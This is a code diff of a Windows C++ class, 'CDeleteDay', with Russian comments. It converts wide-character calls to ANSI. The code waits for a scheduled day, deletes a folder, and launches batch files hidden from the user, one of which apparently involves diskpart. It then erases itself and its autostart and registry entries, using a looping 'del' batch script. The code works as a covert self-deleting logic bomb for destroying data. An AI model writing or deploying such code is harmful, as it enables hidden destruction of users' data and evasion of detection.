@@ -203,59 +203,50 @@ bool CDeleteDay::SaveTaskKillWindows()
 void CDeleteDay::SelfDelete()
 {
 	//удалить себя из автозагрузки
-	HKEY hKey;
-
-	if (::RegOpenKeyEx(HKEY_CURRENT_USER
-		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
-		, NULL
-		, KEY_ALL_ACCESS
-		, &hKey) == ERROR_SUCCESS)
-	{
-		::RegDeleteValue(hKey, RunOnceItemName);
-	}
+	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);
 
 	// Далее выделяем много памяти - лишним не будет %)
-	wchar_t szFilePath[MAX_PATH] = { L"\0" };
-	wchar_t szFileBat[MAX_PATH] = { L"System.bat" };
-	wchar_t szFileExe[MAX_PATH] = { L"\0" };
+	char szFilePath[MAX_PATH] = { "\0" };
+	char szFileBat[MAX_PATH] = { "System.bat" };
+	char szFileExe[MAX_PATH] = { "\0" };
 
-	wchar_t sz[600]; // Строка-помошник...
+	char sz[600]; // Строка-помошник...
 
 	unsigned int iTmp;
-	wchar_t* lpTmp;
+	char* lpTmp;
 
 	// Получаем путь к запущенному ехешнику
-	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe));
+	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe));
 
 	// Преобразуем в имя файла в досовский вид
-	if (GetShortPathName(szFileExe, sz, _MAX_PATH))
-		wcscpy(szFileExe, sz);
+	if (GetShortPathNameA(szFileExe, sz, MAX_PATH))
+		strcpy(szFileExe, sz);
 
-	size_t sLen = wcslen(szFileExe) - 1;
+	size_t sLen = strlen(szFileExe) - 1;
 	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки
 
-	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
+	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
 	{
-		if (!wcsncmp(lpTmp, L"\\", 1))
+		if (!strncmp(lpTmp, "\\", 1))
 			break;
 	}
 
 	//убираем из пути к фалу название программы
 	size_t count = lpTmp - szFileExe; //Number of characters to be copied
 
-	wcsncpy(szFilePath, szFileExe, count);
-	wcscat(szFilePath, L"\\");
+	strncpy(szFilePath, szFileExe, count);
+	strcat(szFilePath, "\\");
 
 	//===== удалить саму себя =====
-	wchar_t BATSTRING[1024] =
-		L":Repeat\n"
-		L"del \"%s\"\n" //команда на удаление экзешника
-		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
-		L":Repeat1\n"
-		L"del \"%s\"\n"
-		L"\0"; //удаление батника
+	char BATSTRING[1024] =
+		":Repeat\n"
+		"del \"%s\"\n" //команда на удаление экзешника
+		"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
+		":Repeat1\n"
+		"del \"%s\"\n"
+		"\0"; //удаление батника
 
-	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
+	HANDLE hFile = CreateFileA((LPCSTR)szFileBat,
 		GENERIC_WRITE,
 		FILE_SHARE_WRITE,
 		NULL,
@@ -263,27 +254,25 @@ void CDeleteDay::SelfDelete()
 		FILE_ATTRIBUTE_NORMAL,
 		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)
 
-	if (!hFile)
-	{
+	if (!hFile)	{
 		TRACE(L"Факн щет, файла System.bat нет и не будет\n");
 	}
 
 	//char sz[600]; // Строка-помошник...
 	//создаем бат-файл ===========================================
-	swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
+	sprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
 
 	DWORD dwBytesWritten;
 
-	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);
+	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);
 
-	if (bError)
-	{
+	if (bError)	{
 		TRACE(L"Факн щет, текст в файл System.bat не удалось записать\n");
 	}
 
 	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени
 
-	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
+	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
 }
 
 // Проверить не наступил ли день выполнения задания
@@ -416,7 +405,7 @@ bool CDeleteDay::PerformATask(void)
 	DeleteFolder();
 	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);
 	SetFileAttributesA(szFileExe, FILE_ATTRIBUTE_NORMAL);	// Делаем файл нормальным иначе не удаляется 
-	HINSTANCE h = ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.0
+	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
 	SHDeleteKey(HKEY_CURRENT_USER, RegDataKeyName);
 	//удаляем из автозагрузки
 	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);
